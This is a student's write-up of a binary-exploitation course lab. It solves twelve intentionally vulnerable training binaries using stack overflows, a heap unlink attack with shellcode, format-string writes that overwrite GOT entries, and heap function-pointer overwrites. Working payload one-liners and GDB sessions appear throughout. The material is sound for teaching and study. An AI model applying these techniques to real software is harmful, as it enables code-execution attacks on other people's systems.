# Hole-In-Bin

## [Subject](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/hole-in-bin)

## [Audit](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/hole-in-bin/audit)

## [Video](https://youtu.be/L_U7KRkjm4A)

#### The video contains proof that the solutions work. Longer explanation for each exercise and how the exploits work is in this readme file

# Table of Contents

1. [Hole-In-Bin](#hole-in-bin)
    - [Subject](#subject)
    - [Audit](#audit)
    - [Video](#video)
2. [Description](#description)
3. [Tools used](#tools-used)
4. [Exercises](#exercises)
    - [EX00](#ex00)
    - [EX01](#ex01)
    - [EX02](#ex02)
    - [EX03](#ex03)
    - [EX04](#ex04)
    - [EX05](#ex05)
    - [EX06](#ex06)
    - [EX07](#ex07)
    - [EX08](#ex08)
    - [EX09](#ex09)
    - [EX10](#ex10)
    - [EX11](#ex11)

## Description

This exercise involves working through a set of binary exploitation challenges, each designed to test different aspects of reverse engineering. Using tools like objdump, GDB, and Python, I analyzed and exploited a series of binaries (from EX00 to EX11). Each challenge required digging into the binaries, understanding their vulnerabilities, and figuring out how to exploit them effectively.

## Tools used:

-   Objdump
-   GDB: The GNU Project Debugger
-   python

## Exercises

-   ## EX00

### Objective

This level is completed when you see the “you have changed the 'modified' variable” message.

### Binary functionality

After running the binary `./bin` it doesn't do anything and seems to wait for some input. After pressing enter it prints "Try again?".

### Process and solution

![img](https://i.imgur.com/8VtqxpD.png)

We can see that `test   eax,eax` we test if someting is zero. Next instruction `je` jumps to "Try again?" message (0x8048500). If it's not 0 then it continues and prints "you have changed the 'modified' variable" (0x8048500).

Since we can see that the value that we are checking gets set to zero and not changed (`mov    DWORD PTR [esp+0x5c],0x0`) we need to create a buffer overflow to overwrite the 0 to something else.

Process:

```sh
# Start debugging
gbp bin
disassemble main
# set break points for gets function and one instruction after that
break *0x0804840c
break *0x08048411
# set hooks to see more info at break points
define hook-stop
info registers
x/24wx $esp
x/2i $eip
end
r
# we can now see the registers, stack and next 2 instructions
c
# Enter A characters to see the changes in the stack
# All the 41 characres on the stack are the A's we entered
# Count how many characters we need to reach the variable we need to overwrite. It this case its 68 characters
# Examine value of address we need to modify
x/wx $esp+0x5c
# We can see its still 0
# run program again
r
c
AAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEFFFF
si
x/wx $esp+0x5c
# now we can see the variable is not 0 anymore
c
# and now we see the "you have changed the 'modified' variable" message

# without gdb
echo "AAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEFFFF" | ./bin
# or simple python oneliner
user@hole-in-bin:/opt/hole-in-bin/ex00$ python -c 'print "A"*(4+16*3+14)' | ./bin

> you have changed the 'modified' variable
```

-   ## EX01

### Objective

This level is completed when you see the “you have correctly got the variable to the right value” message.

### Binary functionality

```sh
./bin
> bin: please specify an argument
# Random argument
./bin 0
> Try again, you got 0x00000000
```

The exploitation process should be pretty much the same as the last exercise, except we have to find the specific value needed and overwrite the bytes with it.

### Process and solution

![img](https://i.imgur.com/GiMUgnI.png)

First `cmp    DWORD PTR [ebp+0x8],0x1` compares something to `1`. After comparison it either continues or prints error message and exits. From that we can assume it checks if program was given enough arguments.

`cmp    eax,0x61626364` comparison is probably the one that checks if the variable value is correct and prints corresponding message. `0x61626364` corresponds to `abcd` so that's what we need to change the variable to.

Also the `strcpy` function which gets called at some point has no bounds checking and can be exploited to get the result we need.

Process:

```sh
gdb bin
# same setup stuff as last ex
# set break point at strcpy
break *0x080484a2
# run with argument (A's so we can see them clearly on a stack)
r AAAAAAAAAAAAAAAA
# we can see the A's on the stack now we need to count how many characters we need for overflow. In this case its 4 + 16 + 16 + 16 + 12 + abcd

# exit back to shell
q
# lets try it out
./bin AAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEdcba
# or
./bin $(python -c 'print "A"*(4+16*3+12)+"dcba"')

> "you have correctly got the variable to the right value"
# FYI: we write the abcd backwards because stack is created from the bottom up.
```

-   ## EX02

### Objective

This level is completed when you see the “you have correctly modified the variable” message.

### Binary functionality

```sh
./bin
bin: please set the GREENIE environment variable
```

We can set our own variable value so it seems its possible to create an overflow again.

### Process and solution

![img](https://i.imgur.com/N7Nx3Oq.png)

`call   0x804837c <getenv@plt>` function searches for the environment string pointed to by name and returns the associated value to the string.
From running the program we already know the variable should be called `GREENIE`

We can create that variable with `export GREENIE=AAAAAAAAAAA`. Now we can run the program without the first error.

Once again there is a `strcpy` func which we can exploit.

And finally `cmp    eax,0xda00d0a` seems to compare the variable we need to overwrite. `da00d0a` are not normal characters though so we cant just write them.

We probably need the same 64 bytes of garbage again to reach the variable.
To achieve it this time we can create a python script that creates the overflow bytes and also adds the special characters to the end. And we need to put it all into the environment variable

```sh
export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
./bin

> you have correctly modified the variable
```

-   ## EX03

### Objective

This level is completed when you see the “code flow successfully changed” message.

### Binary functionality

Running `/bin` seems to wait for some input but doesn't print anything to the terminal.

### Process and solution

![img](https://i.imgur.com/AWZqoiq.png)

From this dump we can see that the main function doesn't contain the message that we want the program to print, therefore we can assume that it has to be in some other function that doesnt get called by the main function.

Being in `gdb` and using `info functions` we can see that there are 2 functions

```sh
File stack3/stack3.c:
int main(int, char **);
void win(void);
```

In addition to the main func there is a win func. After disassembling it we can see it indeed contains the string we want our program to print.

![img](https://i.imgur.com/OWThF5u.png)

(address 0x8048540 contains "code flow successfully changed")

So we need to overwrite the a variable to make it call `win function`. The first address of the funciton is what we need to call it (0x08048424).

We can check the buffer again (it should be 64 bytes like before), by using a python script:

```sh
(python -c "print 'A'*64";) | ./bin
>
#nothing, no overflow
(python -c "print 'A'*65";) | ./bin
calling function pointer, jumping to 0x00000061
Segmentation fault
# we get segmentation fault
```

To create an overflow we can again use a python script again and write the memory location bytes of the win funciton at the end of 64 bytes worth of random other characters

```sh
(python -c "print 'A'*64 + '\x24\x84\x04\x08'";) | ./bin

> code flow successfully changed
```

-   ## EX04

### Objective

This level is completed when you see the “code flow successfully changed” message.

### Binary functionality

This binary behaves the same as the last one. `./bin` seems to wait some input but doesn't print anything no matter the input.

### Process and solution

![img](https://i.imgur.com/kh0Kbrl.png)

Similarly to last exercise, the message we want can not be printed by the main function, and has to be located in some other funciton. `info functions` reveals `win()` funciton again and indeed it contains `0x8048540:      "code flow successfully changed"`.

This time there is no variable to overwrite so we we probably need to target the return address of the main function `eip`.

Let's try to increase the inserted bytes until we get a segmentation fault

```sh
(python -c "print 'A'*64";) | ./bin
(python -c "print 'A'*68";) | ./bin
(python -c "print 'A'*72";) | ./bin
(python -c "print 'A'*76";) | ./bin
> Illegal instruction
```

Now we just need to add the address of the win function `0x080483f4` at the end of the bytes and we're done.

```sh
(python -c "print 'A'*76 + '\xf4\x83\x04\x08'";) | ./bin
> code flow successfully changed
  Segmentation fault
```

We get `segmentation fault` because the original return address of the program has been overwritten so it cant exit properly

-   ## EX05

### Objective

This level is completed when you see the “you have hit the target correctly” message.

### Binary functionality

Running this binary also seems to do nothing, even with argument(s).

### Process and solution

![img](https://i.imgur.com/eO4MTyJ.png)

Nothing much seems to be going on in the main func, but it calls a `vuln` func at the end so lets examine that.

![img](https://i.imgur.com/8q3vi1A.png)

Alot more going on here and indeed it could print the message. There is a variable `DWORD PTR [ebp-0xc]` that gets set to 0 and doesn't get changed. The same variable is later in a comparison `cmp    eax,0xdeadbeef` and if it's equal we get the message we want.

Since we need to overwrite a variable again we can just try and assume we need 64 bytes again and add the address that the program is comparing the variable to at the end.

```sh
./bin $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
> you have hit the target correctly :)
```

-   ## EX06

### Objective

This level is completed when you see the “that wasn't too bad now, was it?” message.

### Binary functionality

Immediately after running the program we get segmentation fault.

```sh
./bin
> Segmentation fault
```

### Process and solution

![img](https://i.imgur.com/TUIMtoU.png)

This time we have a lot longer function but it seems to repeat alot of stuff. `malloc()`, `strcopy()` and `free()` functions all get called 3 times. So the program is allocationg memory for some variables, then copying string values into these variables and finally deallocationg the memory in the reverse order.

If we provide 3 arguments we get a different message

```sh
./bin A B C
dynamite failed?
```

It means 3 arguments are written into 3 variables.

The program also has another function called `winner()` that we have to call to get the right message.

The exploitation in this case can be done through the `free` func, as it allows us to corrupt the heap metadata and redirect the execution to `winner` func. We can exploit the way that free deallocates the memory in the heap (it's called the `unlink exploit`). The exploit leverages the unlink() macro, which manipulates pointers in freed chunks to overwrite data at specific addresses, particularly the Global Offset Table (GOT). One challenge the exploit faces is the presence of null bytes, which can terminate string operations like `strcpy()`. To work around it we can use really large values like `FFFF FFFC` to exploit the way computers handle negative values.

If we take a look at the heap after the malloc functions have run we can
see the bytes where memory gets allocated (the 3 `0x00000029` addresses).

```sh
gdb bin
disassemble main
# set breakpoint at the first strcpy function
break *0x8048750
# run with some characters so we can see them on the heap
r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
c
# find the heap address
info proc mappings
>   0x9a41000  0x9a42000     0x1000        0x0 [heap] # different addresses every time
# now we have the end and start address of the heap
# examine the heap
x/64wx 0x97ac000
                |
                V
```

![img](https://i.imgur.com/4G2FTeg.png)

Continuing until all strcpy funcs have run we can see the values in the heap:

![img](https://i.imgur.com/OsfBteg.png)

To call the winner funciton we have to generate the shellcode that we can overwrite into the global offset table.

After the memory gets freed again by the `free` funcs, we can see that the addresses at the start of the chunk get replaced with pointers to the the next free chunk.

![img](https://i.imgur.com/8sx8hip.png)

When you allocate a chunk of a certain size, the size of the chunk will be written to the 2nd word in the chunk and `malloc` will return the address. The last bit of the chunk size is the previous in use bit, meaning its info about the chunk before. For ex first chunk would have 0x64, and next 0x65 (0x64+1). Once the first chunk is freed the last bit of the next chunk can be set to 0 again. Now if there's a third chunk that doesn't have the last bit set the algorythm wants to merge those two previous blocks. This is where the two words after the size start being important. They are the forward and backward pointer. The free algorithm will merge these two blocks together. It will do that by first unlinking the free block from the linked list, by using the unlink macro. It takes the forward pointing address and writes it at the forward pointer of the previous chunk. And it will take the backward pointing address and write it to the backward pointer of the next chunk. And when we can control the pointers of a free chunk that will be unlinked, we can point into the global offset table and write the forward address there.

To use this exploit we need to overcome the null-byte limitation. when we want to construct a fake chunk that we can unlink, we want to make sure that no field has to contain a null-byte. This means we have to use very large values for the size. When we use large 32 bit integer values like FFFFFFFC and try to add 64, it doesn't fit in 32 bits anymore and the carry of the addition will be lost and now you have a very small value again. In fact it’s 0x60 which is 4 less than 0x64. This means by adding 4 billion, the ffffffc to 100, we actually subtracted 4. And that’s a really useful behaviour for our case. Because this value that doesn’t contain any null-bytes behaves like a very small subtraction. The `free` algorythm will take the size of that chunk, add it to the current address to find the next chunk, which fools free into thinking the next chunk is at -4 from here. Now it will read the size of that chunk, which we could also set to fffffffc, which doesn’t have the last bit set and concludes that the block before was not in use so it unlinks.

`strcpy` stops at a null-byte and this means we have to use one of them to overflow the size of the chunk we want to free with 100, 0x65.

1.

```sh
# Instructions to call the winner function
mov eax, 0x8048864
call eax
# same instructions as shellcode:
"\xB8\x64\x88\x04\x08\xFF\xD0"

$(python -c "print 'A' * 12 + '\xB8\x64\x88\x04\x08\xFF\xD0'")
```

```sh
# To reach the third chunks address that contains the size and overwrite it we need to fill the second chunk:

$(python -c "print 'B' * 36 + '\x65'")
```

```sh
# To fill the third chunk and get the correct addres to the global offset table:

# Size: \xfc\xff\xff\xff \* 2

# Global offset table: 0x804b11c
#                      \x1c\xb1\x04\x08

# Heap: 0x804c000
#       \x00\xc0\x04\x08

$(python -c "print 'C' \* 92 + '\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08'")
```

Final:

```sh
# Shell:
./bin $(python -c "print 'A' * 12 + '\xB8\x64\x88\x04\x08\xFF\xD0'") $(python -c "print 'B' * 36 + '\x65'") $(python -c "print 'C' * 92 + '\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08'")

# GDB:
r `python -c "print 'A' * 12 + '\xB8\x64\x88\x04\x08\xFF\xD0'"` `python -c "print 'B' * 36 + '\x65'"` `python -c "print 'C' * 92 + '\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08'"`

> that wasn't too bad now, was it? @ 1721826986
```

-   ## EX07

### Objective

This level is completed when you see the “you have modified the target” message.

### Binary functionality

Just running `./bin` seems to do nothing but the program does'nt exit either and seems to wait for user input. When I input something random it shows message: `target is 0 :(`

### Process and solution

The main function does nothing special except call vuln function

![img](https://i.imgur.com/pCnfgJR.png)

Disassembly of the vuln function:

![img](https://i.imgur.com/YZzlxJz.png)

The vuln function reads up to 512 bytes of user input into a stack-allocated buffer, prints that input, and then checks if a global variable equals 64. If the variable equals 64, it prints a specific message; otherwise, it prints the variable's value. The function is vulnerable to both buffer overflow and format string attacks.

The key point of interest for exploitation is the fgets call.
fgets reads up to 512 bytes into the buffer at [ebp-0x208].

```sh
# Address to Overwrite:
0x080496e4
'\xe4\x96\x04\x08'

%x%x
# Skips over the next two stack values. This aligns the stack so that when `%n` is encountered, it writes to the correct address.
%49d
# Ensures that 49 characters are printed by this point. The exact number of characters printed affects what value gets written by %n.
%n:
# Writes the number of characters printed so far (49 in this case) to the address specified at the beginning (0x080496e4).
```

By using a format string vulnerability, you are able to write an arbitrary value to an arbitrary address. In this specific case:

The value 49 is written to the address 0x080496e4.

Final:

```sh
python -c "print '\xe4\x96\x04\x08' + '%x%x%49d' + '%n' " | ./bin

> you have modified the target :)
```

-   ## EX08

### Objective

This level is completed when you see the “you have modified the target” message.

### Binary functionality

Same as last, after running seems to wait for some user input and when it's povided shows message: `target is 00000000 :(`

### Process and solution

Seems pretty similar to the last exerciese as it has main function that simply calls vuln funciton.

Vuln function has some differences
![img](https://i.imgur.com/TNHfbAh.png)

The vuln function reads up to 512 bytes of user input into a buffer on the stack and then prints the buffer's contents using a `printbuffer` function. It checks if a global variable equals `0x1025544`, printing a specific message if true; otherwise, it prints a different message along with the variable's value. The function is vulnerable to buffer overflow and format string attacks, which can be exploited to alter the program's execution flow or memory.

This is similar to format 07 except that we now have to precisely control what gets written to target.

Find the Offset of Our Input String:

```sh
user@hole-in-bin:~/hole-in-bin/ex08$ python -c "print 'AAAA' + '%x.' * 12" | ./bin
AAAAb76f7500.bff92c54.b76d7000.0.0.bff92c18.804849d.bff92a10.200.b76d7c20.b76f3328.41414141.
target is 00000000 :(

```

We see the AAAA as 41414141

Find the memory address of the target:

```sh
user@hole-in-bin:~/hole-in-bin/ex08$ objdump -t bin | grep target
080496f4 g     O .bss   00000004              target
```

Address is \xf4\x96\x04\x08 in little endian

Create a format string to write to target.:

```sh
user@hole-in-bin:~/hole-in-bin/ex08$ python -c "print '\xf4\x96\x04\x08' + '%x.' * 11 + '%n'" | ./bin
b7724500.bfb15d44.b7704000.0.0.bfb15d08.804849d.bfb15b00.200.b7704c20.b7720328.
target is 00000053 :(
```

Extend it to write all 4 bytes to target

```sh
user@hole-in-bin:~/hole-in-bin/ex08$ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08' + '%x.'*11 + '%n%n%n%n'" | ./bin
b7723500.bfe69074.b7703000.0.0.bfe69038.804849d.bfe68e30.200.b7703c20.b771f328.
target is 5f5f5f5f :(
```

Value 5f is important later.

We use a combination of padding bytes and %n format specifiers to write specific values to the target variable's memory address. The %n specifier writes the number of bytes printed so far to the location pointed to by the corresponding argument.

Before we can place a %nu before each %n, we need to pad our input string since each %nu also pops the stack. We do this by adding \x01\x01\x01\x01 before each address in our input string.

```sh
python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%u%n%u%n%u%n%u%n'" | ./bin
```

To calculate the correct values for each byte we need a helper function:

```py
def calculate(to_write, written):
    to_write += 0x100
    written %= 0x100
    padding = (to_write - written) % 0x100
    if padding < 10:
        padding += 0x100
    return padding

calculate(0x44, 0x6F)  # Example usage
```

`to_write` is the number we want written to a byte, for example 44 (last byte of the needed value) and `written` is the number of bytes that have been written by the format string function so far. `calculate(0x44, 0x6F)` gets us 213. When I first wrote 4 bytes to target I got `5f` for each byte, adding 16 to that (`\x01\x01\x01\x01\ * 4 bytes`) you get `6F`

We calculate and use the correct padding values to precisely set target to 0x01025544.

```py
calculate(0x44, 0x6F) # 213
calculate(0x55, 0x44) # 17
calculate(0x02, 0x55) # 173
calculate(0x01, 0x02) # 255
```

Final:

```sh
python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%213u%n%17u%n%173u%n%255u%n'" | ./bin
```

```sh
user@hole-in-bin:~/hole-in-bin/ex08$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%213u%n%17u%n%173u%n%255u%n'" | ./bin
b788e500.bfc88274.b786e000.0.0.bfc88238.804849d.bfc88030.200.b786ec20.b788a328.                                                                                                                                                                                                             16843009         16843009                                                                                                                                                                     16843009                                                                                                                                                                                                                                                       16843009
you have modified the target :)
```

-   ## EX09

### Objective

This level is completed when you see the “code execution redirected!” message.

### Binary functionality

After executing the binary it waits for user input and then prints whatever input is supplied.

### Process and solution

Main function again only calls `vuln` function.

![img](https://i.imgur.com/pTCuSmy.png)

The vuln function reads up to 512 bytes of user input into a stack-allocated buffer and then prints this input using printf. After printing, it exits the program with a status code of 1. The function is vulnerable to format string attacks due to the unsafe use of printf with user-supplied data.

There is also a function called `hello()` which we can see by using `info functions` in GDB:

```sh
(gdb) info functions
All defined functions:

File format4/format4.c:
void hello(void);
int main(int, char **);
void vuln(void);
```

![img](https://i.imgur.com/thd8iNd.png)

The `hello` function prints a string located at address 0x80485f0 using the puts function, and then terminates the program by calling \_exit with an exit status of 1.

Address 0x80485f0 contains: `"code execution redirected! you win"`

Since the vuln function does not return and exits insted. That means we can't overwrite the return pointer to point to `hello` function so we have to overwrite the global offset table enrty for `_exit` with the address for `hello`

Funding the GOT address for `_exit`:

```sh
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   # ...
   0x0804850f <+61>:    call   0x80483ec <exit@plt>
End of assembler dump.

(gdb) disassemble 0x80483ec
Dump of assembler code for function exit@plt:
   0x080483ec <+0>:     jmp    DWORD PTR ds:0x8049724
   # ...
End of assembler dump.

(gdb) x 0x8049724
0x8049724 <exit@got.plt>:       0x080483f2
```

So the address we need to overwrite is `0x8049724`

Testing it:

```sh
(gdb) break *0x08048503
(gdb) r
ASDASDASD # random input
(gdb) set {int}0x8049724=0x80484b4 # change exit funcs pointer address in got to hello func address
(gdb) c
Continuing.

code execution redirected! you win

[Inferior 1 (process 1530) exited with code 01]
```

```sh
hello() = 0x80484b4
\xb4\x84\x04\x09
_exit() = 0x8049724
\x24\x97\04\x08
```

We start again by locating the input on the stack:

```sh
user@hole-in-bin:~/hole-in-bin/ex09$ python -c "print 'AAAA' + '%x.' * 3 + '%x'" | ./bin
AAAA200.b777ac20.b7796328.41414141
```

Our string is already the 4th value on the stack.

Now we try to write all 4 bytes of the `exit` got entry

```sh
user@hole-in-bin:~/hole-in-bin/ex09$ python -c "print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08' + '%x.'*3 + '%n%n%n%n'" > a

user@hole-in-bin:~/hole-in-bin/ex09$ gdb bin

(gdb) r < a
Starting program: /home/user/hole-in-bin/ex09/bin < a
$%&'200.b7fd2c20.b7fee328.

Program received signal SIGSEGV, Segmentation fault.
0x26262626 in ?? ()
```

With the information we have we can again calculate the 4 n's we need for the format string parameters using the same python script from the last exercise. Also add the \x01\x01\x01\x01 as padding.

```py
# we get the first 36 by adding dec 16 to hex 0x26 (value of the bytes when we filled the address)
calculate(0xb4, 0x36) # 126
calculate(0x84, 0xb4) # 208
calculate(0x04, 0x84) # 128
calculate(0x08, 0x04) # 260
```

Final:

```sh
python -c "print '\x01\x01\x01\x01\x24\x97\x04\x08\x01\x01\x01\x01\x25\x97\x04\x08\x01\x01\x01\x01\x26\x97\x04\x08\x01\x01\x01\x01\x27\x97\x04\x08' + '%x.'*3 + '%126u%n%208u%n%128u%n%260u%n'" | ./bin
```

```sh
user@hole-in-bin:~/hole-in-bin/ex09$ python -c "print '\x01\x01\x01\x01\x24\x97\x04\x08\x01\x01\x01\x01\x25\x97\x04\x08\x01\x01\x01\x01\x26\x97\x04\x08\x01\x01\x01\x01\x27\x97\x04\x08' + '%x.'*3 + '%126u%n%208u%n%128u%n%260u%n'" | ./bin
$%&'200.b771ac20.b7736328.                                                                                                                      16843009                                                                                                                                                                                                        16843009                                                                                                                        16843009                                                                                                                                                                                                                                                            16843009
code execution redirected! you win
```

-   ## EX10

### Objective

This level is completed when you see the “level passed” message.

### Binary functionality

```sh
user@hole-in-bin:~/hole-in-bin/ex10$ ./bin
data is at 0x952a008, fp is at 0x952a050
Segmentation fault

user@hole-in-bin:~/hole-in-bin/ex10$ python -c "print 'AAAA'" | ./bin
data is at 0x8f3e008, fp is at 0x8f3e050
close failed in file object destructor:
sys.excepthook is missing
lost sys.stderr
Segmentation fault

user@hole-in-bin:~/hole-in-bin/ex10$ ./bin AAAAA
data is at 0x8502008, fp is at 0x8502050
level has not been passed
user@hole-in-bin:~/hole-in-bin/ex10$
```

Running the binary normally we get a `segmentation fault`.
Piping input into bin we also get `segmentation fault`.
Running with arguments we get `level has not been passed`

### Process and solution

We can see that the binary contains 3 functions:

```sh
(gdb) info functions
All defined functions:

File heap0/heap0.c:
int main(int, char **);
void nowinner(void);
void winner(void);
```

`main`, `nowinner` and `winner`

`nowinner` only contains printf func that prints the message `"level has not been passed"`

`winner` function is obviously the one we need to call since it prints `"level passed"`

![img](https://i.imgur.com/rWch3zC.png)

The `main` function in the provided assembly code performs memory allocation and function calling with some string manipulation. Initially, it sets up the stack frame and aligns the stack pointer. It then allocates two blocks of memory: one of size 64 bytes and another of size 4 bytes, storing their addresses. The smaller memory block is initialized with the address 0x8048478. It prepares a printf call to print a string at 0x80485f7 with the two memory block addresses as arguments. Following that, it copies a string from a location specified by one of the input arguments to the larger memory block using strcpy. Finally, it retrieves a function pointer stored in the smaller memory block and calls the function pointed to by that address before cleaning up the stack and returning.

We set a breakpoint after at the `strcpy` where our input gets stored in the heap:

```sh
(gdb) disassemble main
Dump of assembler code for function main:
  # ...
   0x080484f2 <+102>:   call   0x8048368 <strcpy@plt>
   0x080484f7 <+107>:   mov    eax,DWORD PTR [esp+0x1c]
  #...
End of assembler dump.

(gdb) break *0x080484f7
Breakpoint 1 at 0x80484f7: file heap0/heap0.c, line 38.
```

Find heap address:

```sh
(gdb) info proc mappings
process 1936
Mapped address spaces:
        # ...
         0x804a000  0x806b000    0x21000        0x0 [heap]
        # ...
```

Run the program with random input to locate out input on the heap:

```sh
(gdb) r AAAA

(gdb) x/24wx 0x804a000
0x804a000: 0x00000000 0x00000049 0x41414141 0x00000000
0x804a010: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a020: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a030: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a040: 0x00000000 0x00000000 0x00000000 0x00000011
0x804a050: 0x08048478 0x00000000 0x00000000 0x00020fa9
```

We can see our input (41414141) at address 0x804a008 first line

Also at `0x804a050` we can see another entry, it happens to be the address for `nowinner` function, so we simply need to overwirite it with the address of winner.

```sh
(gdb) x 0x08048478
0x8048478 <nowinner>: 0x83e58955

(gdb) x winner
0x8048464 <winner>:     0x83e58955
```

Counting the bytes we can see that we need 72 characters to reach the address of `nowinner`. After that we simply need to add the address of `winner` in little endian

Final:

```sh
user@hole-in-bin:~/hole-in-bin/ex10$ ./bin `python -c "print 'A'*72 + '\x64\x84\x04\x08'"`
data is at 0x8cd5008, fp is at 0x8cd5050
level passed
```

-   ## EX11

### Objective

This level is completed when you see the “and we have a winner” message.

### Binary functionality

Running the binary normally just results in `Segmentation fault`. After supplying two arguments the program prints `and that's a wrap folks!`.

### Process and solution

There are 2 functions, `main` and `winnner`.

```sh
(gdb) info functions
All defined functions:

File heap1/heap1.c:
int main(int, char **);
void winner(void);
```

![img](https://i.imgur.com/DHaPRFz.png)

The main function allocates four 8-byte memory blocks using malloc and initializes the first and third blocks with the values 1 and 2, respectively. It stores pointers to the second and fourth blocks in the first and third blocks. Then, it copies strings from command-line arguments into the second and fourth blocks. Finally, it prints a string stored at address 0x804864b using puts, cleans up the stack, and returns. This function demonstrates dynamic memory allocation and pointer manipulation.

The `winner` function prints `"and we have a winner @ %d\n"` so thats again where we need to redirect the execution of the code.

We know what we need 2 arguments so lets test it in gdb and examine the heap

```sh
# set breakpoint after last strcpy
(gdb) break *0x0804855a
Breakpoint 1 at 0x804855a: file heap1/heap1.c, line 34.

# run with 2 arguments
(gdb) r AAAA BBBB

# find heap
(gdb) info proc mappings
process 1420
Mapped address spaces:

        #...
         0x804a000  0x806b000    0x21000        0x0 [heap]
        # ...

# examine heap
(gdb) x/32wx 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
 # ...
```

We see that `0x0804a038` address on the heap points to the second argument (0x42424242) location. And by using 20 bytes of random characters we can create a buffer overflow and write there anyting we want.

Most reliable method to use would be to overwrite an entry of the GOT (global offset table).
After the `strcopy` in main there's `puts` function so let's overwrite the address for that.

Find `puts` GOT entry address:

```sh
(gdb) disassemble main
Dump of assembler code for function main:
   # ...
   0x08048561 <+168>:   call   0x80483cc <puts@plt> # <--
   # ...
End of assembler dump.

(gdb) x 0x80483cc
0x80483cc <puts@plt>:   0x977425ff

(gdb) disassemble 0x80483cc
Dump of assembler code for function puts@plt:
   0x080483cc <+0>:     jmp    DWORD PTR ds:0x8049774 # <--
   0x080483d2 <+6>:     push   0x30
   0x080483d7 <+11>:    jmp    0x804835c
End of assembler dump.

(gdb) x 0x8049774
0x8049774 <puts@got.plt>:       0x080483d2

# \x74\x97\x04\08
```

From info registers we see that we successfully got control of `eip`, which means we can now redirect code anywhere we want.

```sh
(gdb) r `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` 000011112222333344445555
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/hole-in-bin/ex11/bin `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` 000011112222333344445555

Program received signal SIGSEGV, Segmentation fault.
0x30303030 in ?? ()

(gdb) info registers
# ...

eip            0x30303030       0x30303030 # 30303030 is 0000 in the second argument

# ...
```

Finding the address for `winner`:

```sh
(gdb) x winner
0x8048494 <winner>:     0x83e58955

# \x94\x84\x04\x08
```

So now we simply add address of `winner` as second argument:

```sh
user@hole-in-bin:~/hole-in-bin/ex11$ ./bin `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`
and we have a winner @ 1722427499
```
